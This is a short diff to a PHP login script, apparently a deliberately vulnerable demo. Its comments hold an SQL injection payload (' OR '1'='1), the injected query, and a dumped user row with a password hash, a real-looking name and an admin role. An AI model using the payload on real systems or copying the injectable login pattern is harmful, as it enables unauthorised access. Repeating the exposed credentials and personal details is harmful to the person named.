@@ -193,12 +193,27 @@ if (isset($_SESSION['user_full_name'])){
 			$userFirstName = $row['USER_FIRST_NAME'];
 			$userLastName = $row['USER_LAST_NAME'];
 			$_SESSION['user_full_name'] = $userFirstName . " " . $userLastName;
+			// print_r($row);
+			$_SESSION['data_exploited_from_sql_login'] = $row;
 			header("Location: Index.php");
 			exit();
 		} else {
 			echo "<script> alert('Username / Password no Match!') </script>";
 		}
 		// hello' OR '1'='1 for both inputs.
+
+		// SELECT * FROM user WHERE USER_USERNAME = 'hello' OR '1'='1' AND USER_PASSWORD = 'hello' OR '1'='1'
+		
+		/* 
+		Array ( 
+			[USER_USERNAME] => khaisoon123 
+			[USER_PASSWORD] => 46771e5d8d4e238f69a3ebf9adb0dc5969b90670 
+			[USER_FIRST_NAME] => Khai Soon 
+			[USER_LAST_NAME] => Teow 
+			[USER_ROLE] => Admin 
+			[USER_DESCRIPTION] => Student in Singapore Management University. 
+		)
+		*/
 	}
 }
 
